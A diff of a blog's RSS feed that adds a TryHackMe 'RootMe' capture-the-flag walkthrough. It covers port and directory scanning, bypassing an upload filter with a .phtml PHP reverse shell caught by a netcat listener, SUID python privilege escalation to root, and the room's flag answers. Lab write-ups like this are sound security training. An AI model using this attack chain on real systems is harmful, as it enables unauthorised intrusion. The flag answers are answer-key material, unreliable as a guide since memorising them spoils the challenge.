@@ -6,8 +6,132 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Thu, 13 Apr 2023 10:04:47 -0500</lastBuildDate>
+        <lastBuildDate>Sat, 15 Apr 2023 10:41:56 -0500</lastBuildDate>
         <atom:link href="https://jb-williams.github.io/jbtech.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM_RootMe_Walkthrough</title>
+            <link>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_rootme_walkthrough/</link>
+            <pubDate>Sat, 15 Apr 2023 10:41:56 -0500</pubDate>
+            
+            <guid>https://jb-williams.github.io/jbtech.github.io/posts/2023/04/thm_rootme_walkthrough/</guid>
+            <description>RootMe TryHackMe performed by: jb-williams Deploy the machine Reconnaissance To get info on the target, run this nmap command: nmap -v -T4 -sV -sC -oA nmap/initial 10.10.105.101 This provides the answers to the following three questions. Scan the machine, how many ports ar open? Answer: 2 What version of Apache is running? Answer: 2.4.29 What service is running on port 22? Answer: ssh Find directories on the web server using the GoBuster tool.</description>
+            <content type="html"><![CDATA[<h1 id="rootme-tryhackme">RootMe TryHackMe</h1>
+<h2 id="performed-by-jb-williams">performed by: jb-williams</h2>
+<h1 id="heading"></h1>
+<h3 id="deploy-the-machine"><strong>Deploy the machine</strong></h3>
+<h1 id="heading-1"></h1>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h1 id="heading-2"></h1>
+<ul>
+<li>To get info on the target, run this <code>nmap</code> command:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -T4 -sV -sC -oA nmap/initial 10.10.105.101
+</span></span></code></pre></div><ul>
+<li>This provides the answers to the following three questions.</li>
+</ul>
+<h1 id="heading-3"></h1>
+<h3 id="scan-the-machine-how-many-ports-ar-open"><strong>Scan the machine, how many ports ar open?</strong></h3>
+<ul>
+<li><strong>Answer</strong>: <code>2</code></li>
+</ul>
+<h1 id="heading-4"></h1>
+<h3 id="what-version-of-apache-is-running"><strong>What version of Apache is running?</strong></h3>
+<ul>
+<li><strong>Answer</strong>: <code>2.4.29</code></li>
+</ul>
+<h1 id="heading-5"></h1>
+<h3 id="what-service-is-running-on-port-22"><strong>What service is running on port 22?</strong></h3>
+<ul>
+<li><strong>Answer</strong>: <code>ssh</code></li>
+</ul>
+<h1 id="heading-6"></h1>
+<h3 id="find-directories-on-the-web-server-using-the-gobuster-tool"><strong>Find directories on the web server using the GoBuster tool.</strong></h3>
+<h1 id="heading-7"></h1>
+<ul>
+<li>To find directories you can use <code>gobuster</code> but I prefer <code>feroxbuster</code>.</li>
+<li>Here are the respective commands I would run:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.105.101 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobust.txt -t <span style="color:#ae81ff">15</span>
+</span></span></code></pre></div><ul>
+<li>Since this(below) is my normal command, I also have it set to go through my webproxy so I can capture the requests/responses.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /urs/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -P http://localhost:8080 -e -u http://10.10.105.101/
+</span></span></code></pre></div><h3 id="what-is-the-hidden-direcotry"><strong>What is the hidden direcotry?</strong></h3>
+<ul>
+<li><strong>Answer</strong>: <code>/panel/</code></li>
+</ul>
+<h1 id="heading-8"></h1>
+<h2 id="getting-a-shell">Getting a Shell</h2>
+<h1 id="heading-9"></h1>
+<h3 id="find-a-form-to-upload-and-get-a-reverse-shell-and-find-the-flag"><strong>Find a form to upload and get a reverse shell, and find the flag.</strong></h3>
+<ul>
+<li>With the <code>feroxbuster</code> scan I found both <code>/panel/</code> and <code>/uploads/</code></li>
+<li>Traversing to <code>http://&lt;IP&gt;/panel/</code>, there seems to be a file upload page.</li>
+<li>Tried uploading a reverse shell <code>.php</code> file from <a href="!https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>. It would not allow that extension so I attempted several other PHP file exetensions.</li>
+<li>After a few, I landed on being able to upload a <code>.phtml</code> file.</li>
+<li>Then going to the previously mentioned <code>http://&lt;IP&gt;/uploads/</code>, You can see the previously uploaded files as a directory listing.</li>
+</ul>
+<h1 id="heading-10"></h1>
+<h3 id="usertxt"><strong>user.txt</strong></h3>
+<ul>
+<li>Setup a listener on the port you had provided in the revere shell which <code>nc</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><ul>
+<li>Then clicking on your <code>.phtml</code> reverse shell file in the <code>/uploads/</code> will give you a reverse shell one that server.</li>
+<li>They give us a prompt for the <code>user.txt</code>, if there is a file avail</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#66d9ef">$(</span>find / -type f -iname user.txt 2&gt; /dev/null<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>If you <code>cat</code> that file you get the user flag</p>
+</li>
+<li>
+<p><strong>Answer</strong>: <code>THM{y0u_g0t_a_sh3ll}</code></p>
+</li>
+</ul>
+<h1 id="heading-11"></h1>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h1 id="heading-12"></h1>
+<h3 id="search-for-files-with-suid-permission-which-file-is-weird"><strong>Search for files with SUID permission, which file is weird?</strong></h3>
+<ul>
+<li>To find all <code>SUID</code> files, you can use this command:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><ul>
+<li>
+<p>Looking through the output, sort of using my local machine as a references, this binary looks out of place.</p>
+</li>
+<li>
+<p><strong>Answer</strong>: <code>/usr/bin/python</code></p>
+</li>
+</ul>
+<h1 id="heading-13"></h1>
+<h3 id="find-a-form-to-escalate-your-privileges"><strong>Find a form to escalate your privileges.</strong></h3>
+<ul>
+<li>Knowing that we have access to the <code>SUID</code> <code>/usr/bin/python</code>, the first thing I tend to do is check <a href="!https://gtfobins.github.io/">GTFOBins</a>, to see if there are any options there.</li>
+<li>After attempting the one listed. I actually couldn&rsquo;t get it to work properly, so after looking at previous notes and trying different ways, I found these two commands each work depending on you shell preference.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
+</span></span></code></pre></div><p>or</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import os; os.execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-p&#34;)&#39;</span>
+</span></span></code></pre></div><h1 id="heading-14"></h1>
+<h3 id="roottxt"><strong>root.txt</strong></h3>
+<ul>
+<li>After using that python command, <code>root</code> access was given, again they prompted us with <code>root.txt</code>, assuming it was in the <code>/root</code> directory I just used <code>cat</code> on the absolute path.</li>
+<li>You could also use this command if the file was not in the <code>/root</code> directory.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat <span style="color:#66d9ef">$(</span>find / -type f -iname root.txt 2&gt; /dev/null<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><ul>
+<li><strong>Answer</strong>: <code>THM{pr1v1l3g3_3sc4l4t10n}</code></li>
+</ul>
+<h1 id="heading-15"></h1>
+<h1 id="heading-16"></h1>
+<h1 id="heading-17"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>THM_PickleRick_Walkthrough</title>
